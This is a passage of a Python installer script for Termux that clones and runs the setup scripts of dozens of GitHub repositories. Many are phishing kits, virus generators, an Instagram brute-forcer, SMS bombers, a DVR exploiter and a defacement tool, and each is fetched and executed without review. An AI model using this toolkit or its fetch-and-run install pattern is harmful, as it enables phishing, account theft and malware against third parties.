    print(f"\033[1;91m[*]\033[1;97m Metasploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access metasploit by command 'msfconsole'.")
    print()

# 21 easyhack
def easyhack():
    print(f"\n\033[1;91m[*]\033[1;97m Installing EasY_HaCk.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/sabri-zaki/EasY_HaCk")
    os.system("mv EasY_HaCk /$HOME")
    os.system("cd /$HOME/EasY_HaCk")
    os.system("chmod +x *")
    os.system("sh install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m EasY_HaCk is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'EasY-HaCk' to access EasY_HaCk.")
    print()

# 22 infect
def infect():
    print(f"\n\033[1;91m[*]\033[1;97m Installing infect.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/infect")
    os.system("mv infect /$HOME")
    os.system("cd /$HOME/infect")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m infect is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find infect on your termux's home directory.")
    print()

# 23 onex
def onex():
    print(f"\n\033[1;91m[*]\033[1;97m Installing onex.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jackind424/onex")
    os.system("mv onex /$HOME")
    os.system("cd /$HOME/onex")
    os.system("chmod +x *")
    os.system("sh install")
    print()
    print(f"\033[1;91m[*]\033[1;97m onex is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'onex' to access onex.")
    print()

# 24 dnsmap
def dnsmp():
    print(f"\n\033[1;91m[*]\033[1;97m Installing dnsmap.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install dnsmap -y")
    print()
    print(f"\033[1;91m[*]\033[1;97m dnsmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access dnsmap by command 'dnsmap'.")
    print()

# 25 SocialBox-Termux
def toolboxt():
    print(f"\n\033[1;91m[*]\033[1;97m Installing SocialBox-Termux.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/samsesh/SocialBox-Termux.git/")
    os.system("mv SocialBox-Termux /$HOME")
    os.system("cd /$HOME/SocialBox-Termux")
    os.system("chmod +x *")
    os.system("./install-sb.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m SocialBox-Termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find SocialBox-Termux on your termux's home directory.")
    print()

# 26 maskphish
def maskphish():
    print(f"\n\033[1;91m[*]\033[1;97m Installing maskphish.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jaykali/maskphish.git/")
    os.system("mv maskphish /$HOME")
    os.system("cd /$HOME/maskphish")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m maskphish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find maskphish on your termux's home directory.")
    print()

# 27 mrphish
def mrphish():
    print(f"\n\033[1;91m[*]\033[1;97m Installing mrphish.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/mrphish")
    os.system("mv mrphish /$HOME")
    os.system("cd /$HOME/mrphish")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print(f"\033[1;91m[*]\033[1;97m mrphish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find mrphish on your termux's home directory.")
    print()

# 28 hacklock
def hacklock():
    print(f"\n\033[1;91m[*]\033[1;97m Installing hacklock.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/hacklock")
    os.system("mv hacklock /$HOME")
    os.system("cd /$HOME/hacklock")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print(f"\033[1;91m[*]\033[1;97m hacklock is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find hacklock on your termux's home directory.")
    print()

# 29 AllHackingTools
def AllHackingTools():
    print(f"\n\033[1;91m[*]\033[1;97m Installing AllHackingTools.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/mishakorzik/AllHackingTools")
    os.system("mv AllHackingTools /$HOME")
    os.system("cd /$HOME/AllHackingTools")
    os.system("termux-setup-storage")
    os.system("chmod +x *")
    os.system("bash Install.sh")
    os.system("bash fix.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m AllHackingTools is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'msdconsole' to access AllHackingTools.")
    print()

# 30 instahack
def instahack():
    print(f"\n\033[1;91m[*]\033[1;97m Installing instahack.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 wget curl -y")
    os.system("git clone https://github.com/evildevill/instahack.git/")
    os.system("mv instahack /$HOME")
    os.system("cd /$HOME/instahack")
    os.system("chmod +x *")
    os.system("bash setup_env.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m instahack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find instahack on your termux's home directory.")
    print()

# 31 kalimux
def kalimux():
    print(f"\n\033[1;91m[*]\033[1;97m Installing kalimux.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/noob-hackers/kalimux")
    os.system("mv kalimux /$HOME")
    os.system("cd /$HOME/kalimux")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m kalimux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find kalimux on your termux's home directory.")
    print()

# 32 LinuxX
def LinuxX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing LinuxX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/LinuxX.git/")
    os.system("mv LinuxX /$HOME")
    os.system("cd /$HOME/LinuxX")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m LinuxX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'linuxx' to access LinuxX.")
    print()

# 33 TermuxArch
def TermuxArch():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TermuxArch.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/TermuxArch/TermuxArch")
    os.system("mv TermuxArch /$HOME")
    os.system("cd /$HOME/TermuxArch")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m TermuxArch is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TermuxArch on your termux's home directory.")
    print()

# 34 Lucifer
def Lucifer():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Lucifer.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/rixon-cochi/Lucifer.git/")
    os.system("mv Lucifer /$HOME")
    os.system("cd /$HOME/Lucifer")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Lucifer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Lucifer on your termux's home directory.")
    print()

# 35
def AdminHack():
    print(f"\n\033[1;91m[*]\033[1;97m Installing AdminHack.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/mishakorzik/AdminHack")
    os.system("mv AdminHack /$HOME")
    os.system("cd /$HOME/AdminHack")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m AdminHack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find AdminHack on your termux's home directory.")
    print()

# 36 TermuxCyberArmy
def TermuxCyberArmy():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TermuxCyberArmy.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git pytho2 -y")
    os.system("git clone https://github.com/Err0r-ICA/TermuxCyberArmy.git/")
    os.system("mv TermuxCyberArmy /$HOME")
    os.system("cd /$HOME/TermuxCyberArmy")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m TermuxCyberArmy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TermuxCyberArmy on your termux's home directory.")
    print()

# 37 userfinder
def userfinder():
    print(f"\n\033[1;91m[*]\033[1;97m Installing userfinder.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl -y")
    os.system("git clone https://github.com/machine1337/userfinder")
    os.system("mv userfinder /$HOME")
    os.system("cd /$HOME/userfinder")
    os.system("chmod +x *")
    os.system("")
    print()
    print(f"\033[1;91m[*]\033[1;97m userfinder is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find userfinder on your termux's home directory.")
    print()

# 38 tunnel
def tunnel():
    print(f"\n\033[1;91m[*]\033[1;97m Installing tunnel.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/tunnel.git")
    os.system("mv tunnel /$HOME")
    os.system("cd /$HOME/tunnel")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m tunnel is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find tunnel on your termux's home directory.")
    print()

# 39 tstyle
def tstyle():
    print(f"\n\033[1;91m[*]\033[1;97m Installing tstyle.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/htr-tech/tstyle")
    os.system("mv tstyle /$HOME")
    os.system("cd /$HOME/tstyle")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m tstyle is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type 'tstyle' to access tstyle.")
    print()

# 40 FreeFire-Phishing
def freefire():
    print(f"\n\033[1;91m[*]\033[1;97m Installing FreeFire-Phishing.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/OnlineHacKing/FreeFire-Phishing")
    os.system("mv FreeFire-Phishing /$HOME")
    os.system("cd /$HOME/FreeFire-Phishing")
    os.system("chmod +x *")
    os.system("bash Android-Setup")
    print()
    print(f"\033[1;91m[*]\033[1;97m FreeFire-Phishing is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command '' to access FreeFire-Phishing.")
    print()

# 41 qurxin
def qurxin():
    print(f"\n\033[1;91m[*]\033[1;97m Installing qurxin.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python mpv figlet -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/fikrado/qurxin")
    os.system("mv qurxin /$HOME")
    os.system("cd /$HOME/qurxin")
    os.system("chmod +x *")
    os.system("sh install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m qurxin is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find qurxin on your termux's home directory.")
    print()

# 42 GenVirus
def GenVirus():
    print(f"\n\033[1;91m[*]\033[1;97m Installing GenVirus.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Ign0r3dH4x0r/GenVirus")
    os.system("mv GenVirus /$HOME")
    os.system("cd /$HOME/GenVirus")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m GenVirus is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find GenVirus on your termux's home directory.")
    print()

# 43 WannaTool
def WannaTool():
    print(f"\n\033[1;91m[*]\033[1;97m Installing WannaTool.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Err0r-ICA/WannaTool")
    os.system("mv WannaTool /$HOME")
    os.system("cd /$HOME/WannaTool")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m WannaTool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find WannaTool on your termux's home directory.")
    print()

# 44 GeonumWh
def GeonumWh():
    print(f"\n\033[1;91m[*]\033[1;97m Installing GeonumWh.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/WhBeatZ/GeonumWh")
    os.system("mv GeonumWh /$HOME")
    os.system("cd /$HOME/GeonumWh")
    os.system("chmod +x *")
    os.system("bash requirements.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m GeonumWh is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find GeonumWh on your termux's home directory.")
    print()

# 45 apktool
def apktool():
    print(f"\n\033[1;91m[*]\033[1;97m Installing apktool.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install apktool -y")
    print()
    print(f"\033[1;91m[*]\033[1;97m apktool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access apktool by command 'apktool'.")
    print()

# 46 PUBG-BGMI_Phishing
def bgmip():
    print(f"\n\033[1;91m[*]\033[1;97m Installing PUBG-BGMI_Phishing.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/OnlineHacKing/PUBG-BGMI_Phishing.git")
    os.system("mv PUBG-BGMI_Phishing /$HOME")
    os.system("cd /$HOME/PUBG-BGMI_Phishing")
    os.system("chmod +x *")
    os.system("bash Android-Setup")
    print()
    print(f"\033[1;91m[*]\033[1;97m PUBG-BGMI_Phishing is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'PUBG-BGMI_Phishing' to access PUBG-BGMI_Phishing.")
    print()

# 47 HXP-Ducky
def hsxpduky():
    print(f"\n\033[1;91m[*]\033[1;97m Installing HXP-Ducky.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/hackerxphantom/HXP-Ducky")
    os.system("mv HXP-Ducky /$HOME")
    os.system("cd /$HOME/HXP-Ducky")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m HXP-Ducky is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find HXP-Ducky on your termux's home directory.")
    print()

# 48 Venomsploit
def Venomsploit():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Venomsploit.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/Venomsploit")
    os.system("mv Venomsploit /$HOME")
    os.system("cd /$HOME/Venomsploit")
    os.system("chmod +x *")
    os.system("bash install")
    print()
    print(f"\033[1;91m[*]\033[1;97m Venomsploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Venomsploit on your termux's home directory.")
    print()

# 49 DVR-Exploiter
def dvrsploit():
    print(f"\n\033[1;91m[*]\033[1;97m Installing DVR-Exploiter.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/TunisianEagles/DVR-Exploiter.git")
    os.system("mv DVR-Exploiter /$HOME")
    os.system("cd /$HOME/DVR-Exploiter")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m DVR-Exploiter is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DVR-Exploiter on your termux's home directory.")
    print()

# 50 B4Bomber
def BeBomber():
    print(f"\n\033[1;91m[*]\033[1;97m Installing B4Bomber.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl -y")
    os.system("git clone https://github.com/mahendraplus/B4Bomber")
    os.system("mv B4Bomber /$HOME")
    os.system("cd /$HOME/B4Bomber/Termux")
    os.system("chmod +x *")
    os.system("bash install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m B4Bomber is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find B4Bomber on your termux's home directory.")
    print()

# 51 h-sploit-paylod
def hsploit():
    print(f"\n\033[1;91m[*]\033[1;97m Installing h-sploit-paylod.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jravis-8520/h-sploit-paylod.git/")
    os.system("mv h-sploit-paylod /$HOME")
    os.system("cd /$HOME/h-sploit-paylod")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m h-sploit-paylod is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find h-sploit-paylod on your termux's home directory.")
    print()

# 52 WhSms
def WhSms():
    print(f"\n\033[1;91m[*]\033[1;97m Installing WhSms.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/WhBeatZ/WhSms")
    os.system("mv WhSms /$HOME")
    os.system("cd /$HOME/WhSms")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m WhSms is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find WhSms on your termux's home directory.")
    print()


# 53 rsecxxx-leak
def rsecxxx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing rsecxxx-leak.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Alice666x/rsecxxx-leak")
    os.system("mv rsecxxx-leak /$HOME")
    os.system("cd /$HOME/rsecxxx-leak")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m rsecxxx-leak is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find rsecxxx-leak on your termux's home directory.")
    print()

# 54 netscan
def netscan():
    print(f"\n\033[1;91m[*]\033[1;97m Installing netscan.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install golang -y")
    os.system("go get github.com/jessfraz/netscan")
    print()
    print(f"\033[1;91m[*]\033[1;97m netscan is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access netscan by command 'netscan'.")
    print()

# 55 modded-ubuntu
def mubuntu():
    print(f"\n\033[1;91m[*]\033[1;97m Installing modded-ubuntu.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/modded-ubuntu/modded-ubuntu")
    os.system("mv modded-ubuntu /$HOME")
    os.system("cd /$HOME/modded-ubuntu")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m modded-ubuntu is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find modded-ubuntu on your termux's home directory.")
    print()

# 56 seeu
def seeu():
    print(f"\n\033[1;91m[*]\033[1;97m Installing seeu.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl wget php nodejs -y")
    os.system("termux-setup-storage")
    os.system("npm install ngrok -g")
    os.system("git clone https://github.com/noob-hackers/seeu.git/")
    os.system("mv seeu /$HOME")
    os.system("cd /$HOME/seeu")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m seeu is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find seeu on your termux's home directory.")
    print()

# 57 zVirus-Gen
def zvirusg():
    print(f"\n\033[1;91m[*]\033[1;97m Installing zVirus-Gen.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/ZechBron/zVirus-Gen")
    os.system("mv zVirus-Gen /$HOME")
    os.system("cd /$HOME/zVirus-Gen")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m zVirus-Gen is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find zVirus-Gen on your termux's home directory.")
    print()

# 58 LordPhish
def LordPhish():
    print(f"\n\033[1;91m[*]\033[1;97m Installing LordPhish.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git openssh wget php -y")
    os.system("git clone https://github.com/Black-Hell-Team/LordPhish")
    os.system("mv LordPhish /$HOME")
    os.system("cd /$HOME/LordPhish")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m LordPhish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find LordPhish on your termux's home directory.")
    print()

# 59 Brutegram
def Brutegram():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Brutegram.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 jq -y")
    os.system("pip2 install requests mechanize")
    os.system("git clone https://github.com/Err0r-ICA/Brutegram")
    os.system("mv Brutegram /$HOME")
    os.system("cd /$HOME/Brutegram")
    os.system("chmod +x *")
    os.system("")
    print()
    print(f"\033[1;91m[*]\033[1;97m Brutegram is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Brutegram on your termux's home directory.")
    print()

# 60 Osintgram
def Osintgram():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Osintgram.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/Datalux/Osintgram ")
    os.system("mv Osintgram /$HOME")
    os.system("cd /$HOME/Osintgram")
    os.system("python3 -m venv venv")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Osintgram is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Osintgram on your termux's home directory.")
    print()

# 61 Pycompile
def Pycompile():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Pycompile.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/htr-tech/Pycompile")
    os.system("mv Pycompile /$HOME")
    os.system("cd /$HOME/Pycompile")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Pycompile is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Pycompile on your termux's home directory.")
    print()

# 62 AOXdeface
def AOXdeface():
    print(f"\n\033[1;91m[*]\033[1;97m Installing AOXdeface.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip install requests")
    os.system("git clone https://github.com/Ranginang67/AOXdeface")
    os.system("mv AOXdeface /$HOME")
    os.system("cd /$HOME/AOXdeface")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m AOXdeface is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find AOXdeface on your termux's home directory.")
    print()

# 63 termux-key
def termuxkey():
    print(f"\n\033[1;91m[*]\033[1;97m Installing termux-key.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/htr-tech/termux-key")
    os.system("mv termux-key /$HOME")
    os.system("cd /$HOME/termux-key")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m termux-key is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-key on your termux's home directory.")
    print()

# 64 Termux-heroku-cli
def heroku():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Termux-heroku-cli.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/SKGHD/Termux-heroku-cli")
    os.system("mv Termux-heroku-cli /$HOME")
    os.system("cd /$HOME/Termux-heroku-cli")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Termux-heroku-cli is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Termux-heroku-cli on your termux's home directory.")
    print()

# 65 DefGen
def DefGen():
    print(f"\n\033[1;91m[*]\033[1;97m Installing DefGen.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/DefGen")
    os.system("mv DefGen /$HOME")
    os.system("cd /$HOME/DefGen")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m DefGen is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DefGen on your termux's home directory.")
    print()

# 66 websploit
def websploit():
    print(f"\n\033[1;91m[*]\033[1;97m Installing websploit.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/f4rih/websploit")
    os.system("mv websploit /$HOME")
    os.system("cd /$HOME/websploit")
    os.system("chmod +x *")
    os.system("python setup.py install")
    print()
    print(f"\033[1;91m[*]\033[1;97m websploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access websploit by command 'websploit'.")
    print()

# 67 M-dork
def Mdork():
    print(f"\n\033[1;91m[*]\033[1;97m Installing M-dork.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip2 install mechanize")
    os.system("git clone https://github.com/Ranginang67/M-dork")
    os.system("mv M-dork /$HOME")
    os.system("cd /$HOME/M-dork")
    os.system("chmod +x *")
    print()
